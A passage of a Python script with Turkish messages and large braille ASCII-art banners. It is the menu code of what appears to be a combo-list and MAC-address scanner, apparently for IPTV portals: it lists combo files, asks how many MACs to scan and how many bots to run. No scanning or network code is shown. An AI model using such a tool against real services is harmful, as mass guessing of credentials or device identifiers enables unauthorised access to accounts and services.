⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣸⣧⣤⣤⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠸⡆⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠛⠉⠙⠃⣿⡇⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠛⠛⠛⠛⠿⢿⣿⣷⣦⣄⡀⠀⠀⠀⢰⡇⠀⠀⢻⣄⠀⣀⣴⣾⣿⠿⠟⣩⠇⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠸⣦⣛⣛⣻⡿⠷⠶⠶⢿⡇⠀⠀⢸⡟⠿⠟⠛⠙⠓⠲⠾⣦⠀⠀⠀⠀⣠⣾⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠠⠞⠛⠁⠀⠀⠀⢀⣼⣧⠀⠀⠀⡿⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡁⠙⠀⠀⠰⢃⣸⡏⠉⠉⠛⢶⣄⡀⠀⠀⠀⢸⡁⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠻⡆⠀⠀⠀⠀⢀⣼⠏⠀⠘⠻⢷⣤⣤⣶⠟⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠈⡇⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢿⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠃⠀⠀⢸⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢸⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⣾⡏⠉⠙⠛⠒⠒⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⣿⣆⠀⠀⠀⠀⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠃⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠁⠀⠀⠙⢿⣷⣀⠀⠀⠹⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡴⠶⠛⠉⠉⠹⣷⠀⠀⠀⠀⠀⢀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⣿⣦⡀⠀⠁⠀⣾⡉⠀⢀⣠⣉⡉⣻⡿⣧⣤⡤⠞⣲⣶⠚⢻⡇⠀⠀⠀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⣠⠿⠭⠽⠗⠒⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⡉⠉⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠰⣄⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⠀⣀⣠⡼⠃⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀⠈⠓⠒⠒⠛⠉⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⠁⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠤⢤⣤⣤⣄⣀⡀⠈⠛⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⣴⣶⣶⣶⣾⠿⠛⠉⠀⠀⠀⣠⣴⡶⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠷⣦⣤⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⢦⣤⣀⡤⠴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m

\033[1;91m               List of available combos           \33[0m
"""+dsy+"""
\033[1;92m               I find \033[1;91m""" +str(say)+""" \033[1;92mCombos         
	""")
 	dsyno=str(input("\033[1;96mCombo Nr=\033[1;92m"))
 	say=0
 	
 	if dsyno=="":
 		dsyno="0"
 	if dsyno=="0":
 		
 		print(feyzo) 
 		
 		
 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  '
 			if int(xd) <9:
 				tire='   '
 			print(str(xd+1)+tire+yeninesil[xd])
 		
 		
 		
 		
 		mactur=input("\n\033[1;91mMac combination type \33[0m\n\033[1;96mChoose=\033[1;92m")
 		if mactur=="":
 			mactur=14
 		print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		uz=input("""
\033[1;92m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣶⣶⡾⠷⠷⣶⣶⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⢡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⢻⡀⠀⠀⠘⣿⣦⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⡏⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣄⠀⠀⠀⢳⡄⠀⠀⣿⡿⠿⠿⣿⣿⣿⣷⣦⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣏⣿⠀⠀⠀⠀⠀⣴⡇⠀⣼⡁⠀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠈⢻⣏⠻⠶⣤⣀⡀⠀⠀⠀⠘⢿⣷⡄⠀⠈⣿⠀⠀⣸⡇⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣷⣶⣄⡀
⠀⠀⢀⣠⣤⣶⣾⣿⡟⠀⠀⠀⢀⣾⣿⠁⣰⣿⣇⠀⠀⢸⣇⠙⠷⣤⣄⠀⠀⠀⠀⠙⢷⣤⡀⠉⠙⠛⠲⢶⣤⣌⣷⡟⣦⠀⢸⣇⠀⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻
⣾⡿⠿⠟⠛⠋⠁⢸⣧⠀⠀⠀⣼⠏⣿⣆⣿⠃⢿⣆⠀⠀⢿⣆⠀⠈⠙⠛⠷⠦⣤⣤⣄⣙⣻⣦⣤⣠⠀⠀⠀⠈⠉⠛⠛⢷⣼⣿⢰⡟⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢸⡿⠀⢻⣿⡿⠀⠈⢻⣦⣀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⡌⢻⣿⣿⠏⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⣾⡇⠀⠈⢿⡇⠀⠀⠀⠉⠻⣷⣌⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⣿⢹⡟⢱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡏⣿⡄⣿⡇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣿⣜⣴⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⡆⣿⠙⠛⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣸⣧⣤⣤⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠸⡆⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠛⠉⠙⠃⣿⡇⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠛⠛⠛⠛⠿⢿⣿⣷⣦⣄⡀⠀⠀⠀⢰⡇⠀⠀⢻⣄⠀⣀⣴⣾⣿⠿⠟⣩⠇⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠸⣦⣛⣛⣻⡿⠷⠶⠶⢿⡇⠀⠀⢸⡟⠿⠟⠛⠙⠓⠲⠾⣦⠀⠀⠀⠀⣠⣾⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠠⠞⠛⠁⠀⠀⠀⢀⣼⣧⠀⠀⠀⡿⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡁⠙⠀⠀⠰⢃⣸⡏⠉⠉⠛⢶⣄⡀⠀⠀⠀⢸⡁⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠻⡆⠀⠀⠀⠀⢀⣼⠏⠀⠘⠻⢷⣤⣤⣶⠟⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠈⡇⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢿⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠃⠀⠀⢸⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢸⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⣾⡏⠉⠙⠛⠒⠒⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⣿⣆⠀⠀⠀⠀⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠃⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠁⠀⠀⠙⢿⣷⣀⠀⠀⠹⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡴⠶⠛⠉⠉⠹⣷⠀⠀⠀⠀⠀⢀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⣿⣦⡀⠀⠁⠀⣾⡉⠀⢀⣠⣉⡉⣻⡿⣧⣤⡤⠞⣲⣶⠚⢻⡇⠀⠀⠀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⣠⠿⠭⠽⠗⠒⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⡉⠉⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠰⣄⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⠀⣀⣠⡼⠃⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀⠈⠓⠒⠒⠛⠉⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⠁⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠤⢤⣤⣤⣄⣀⡀⠈⠛⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⣴⣶⣶⣶⣾⠿⠛⠉⠀⠀⠀⣠⣴⡶⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠷⣦⣤⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⢦⣤⣀⡤⠴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m

\033[1;91m                 How many Macs do you want to scan    \33[0m

\033[1;96mMacNr=\033[1;92m""")
 		if uz=="":
 			uz=30000
 		uz=int(uz) 
 		print(uz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		
	 		#subprocess.run(["clear", ""])
	 		#subprocess.run(["clear", ""])
	 		print("Hatalı combo dosya seçimi...!")
	 		quit()
	 	c=open(dosyaa, 'r', encoding='utf-8')
	 	totLen=c.readlines()
	 	uz=(len(totLen))
 	
 	
 	#subprocess.run(["clear", ""])
 	print(feyzo) 
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		
#subproces	s.run(["clear", ""])
#print(feyzo)  	

botsay=input("""
\033[1;92m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣶⣶⡾⠷⠷⣶⣶⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⢡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⢻⡀⠀⠀⠘⣿⣦⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⡏⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣄⠀⠀⠀⢳⡄⠀⠀⣿⡿⠿⠿⣿⣿⣿⣷⣦⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣏⣿⠀⠀⠀⠀⠀⣴⡇⠀⣼⡁⠀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠈⢻⣏⠻⠶⣤⣀⡀⠀⠀⠀⠘⢿⣷⡄⠀⠈⣿⠀⠀⣸⡇⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣷⣶⣄⡀
⠀⠀⢀⣠⣤⣶⣾⣿⡟⠀⠀⠀⢀⣾⣿⠁⣰⣿⣇⠀⠀⢸⣇⠙⠷⣤⣄⠀⠀⠀⠀⠙⢷⣤⡀⠉⠙⠛⠲⢶⣤⣌⣷⡟⣦⠀⢸⣇⠀⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻
⣾⡿⠿⠟⠛⠋⠁⢸⣧⠀⠀⠀⣼⠏⣿⣆⣿⠃⢿⣆⠀⠀⢿⣆⠀⠈⠙⠛⠷⠦⣤⣤⣄⣙⣻⣦⣤⣠⠀⠀⠀⠈⠉⠛⠛⢷⣼⣿⢰⡟⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢸⡿⠀⢻⣿⡿⠀⠈⢻⣦⣀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⡌⢻⣿⣿⠏⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⣾⡇⠀⠈⢿⡇⠀⠀⠀⠉⠻⣷⣌⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⣿⢹⡟⢱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡏⣿⡄⣿⡇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣿⣜⣴⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
